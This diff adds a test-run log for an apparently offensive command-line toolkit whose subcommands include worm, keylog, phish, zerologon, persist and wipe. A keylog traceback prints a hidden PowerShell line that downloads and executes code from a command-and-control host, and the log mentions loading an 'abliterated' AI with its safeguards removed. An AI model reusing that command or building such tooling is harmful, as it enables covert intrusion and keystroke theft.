@@ -1,0 +1,65 @@
+[serve] rc=124 tracebacks=0
+[foxacid] rc=124 tracebacks=0
+[quantum] rc=124 tracebacks=0
+[recon] rc=124 tracebacks=0
+[osint] rc=0 tracebacks=0
+[auto] rc=124 tracebacks=0
+[dohc2] rc=124 tracebacks=0
+[icmp] rc=124 tracebacks=0
+[trinity] rc=124 tracebacks=0
+[camwar] rc=124 tracebacks=0
+[cams] rc=124 tracebacks=0
+[wifi] rc=0 tracebacks=0
+[triage] rc=0 tracebacks=0
+[mfp] rc=0 tracebacks=0
+[pcap] rc=0 tracebacks=0
+[camshot] rc=124 tracebacks=0
+[router] rc=124 tracebacks=0
+[worm] rc=124 tracebacks=0
+[episcribe] rc=124 tracebacks=0
+[cottonmouth] rc=124 tracebacks=0
+[validator] rc=124 tracebacks=0
+[tor] rc=0 tracebacks=0
+[seal] rc=0 tracebacks=0
+[unseal] rc=0 tracebacks=0
+[brute] rc=124 tracebacks=0
+[phish] rc=0 tracebacks=0
+[keygen] rc=0 tracebacks=0
+[deployai] rc=0 tracebacks=0
+[zerologon] rc=0 tracebacks=0
+[mitre] rc=0 tracebacks=0
+[federation] rc=0 tracebacks=0
+[posixagent] rc=0 tracebacks=0
+[zerocheck] rc=124 tracebacks=0
+[mshtmaldoc] rc=0 tracebacks=0
+[flashfill] rc=124 tracebacks=0
+[emoji] rc=1 tracebacks=1
+--- emoji traceback ---
+[AI] no ABLITERATION_KEY found. Use Abliterated.ai? Paste key (5s): [AI] AI bootstrap: no key — QBrain/local fallback active
+Message: Traceback (most recent call last):
+  File "C:\Projects\Quantum CLI\quantum_cli.py", line 24, in <module>
+    sys.exit(main(sys.argv[1:]))
+             ~~~~^^^^^^^^^^^^^^
+  File "C:\Projects\Quantum CLI\src\quantum\__main__.py", line 315, in main
+    msg = input("Message: ") or "ping"
+          ~~~~~^^^^^^^^^^^^^
+EOFError: EOF when reading a line
+[macreset] rc=0 tracebacks=0
+[keylog] rc=1 tracebacks=1
+--- keylog traceback ---
+[AI] no ABLITERATION_KEY found. Use Abliterated.ai? Paste key (5s): [AI] AI bootstrap: no key — QBrain/local fallback active
+Traceback (most recent call last):
+  File "C:\Projects\Quantum CLI\quantum_cli.py", line 24, in <module>
+    sys.exit(main(sys.argv[1:]))
+             ~~~~^^^^^^^^^^^^^^
+  File "C:\Projects\Quantum CLI\src\quantum\__main__.py", line 318, in main
+    elif a.cmd == "keylog":    print(json.dumps({"staged": stage_keylogger()})); return
+                                                           ~~~~~~~~~~~~~~~^^
+  File "C:\Projects\Quantum CLI\src\quantum\postexploit\kitlogger.py", line 58, in stage_keylogger
+    {"act": "run", "cmd": f"powershell -w hidden -c \"IEX(iwr http://{c}:{c2_port}/s/default -UseBasicParsing)\"",
+                                                                      ^
+NameError: name 'c' is not defined. Did you mean: 'c2'?
+[wipe] rc=124 tracebacks=0
+[persist] rc=124 tracebacks=0
+[ghostdns] rc=0 tracebacks=0
+[cagebreak] rc=124 tracebacks=0
